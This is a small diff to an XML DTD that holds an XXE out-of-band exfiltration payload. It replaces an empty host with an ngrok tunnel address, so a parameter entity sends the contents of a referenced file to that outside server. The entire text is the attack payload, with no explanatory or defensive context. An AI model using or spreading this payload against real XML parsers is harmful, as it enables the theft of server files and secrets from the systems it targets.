@@ -1,2 +1,2 @@
-<!ENTITY % payload "<!ENTITY send SYSTEM 'https:///out?data=%file;'>">
+<!ENTITY % payload "<!ENTITY send SYSTEM 'https://televisional-camryn-quarrelsomely.ngrok-free.dev/out?data=%file;'>">
 %payload;
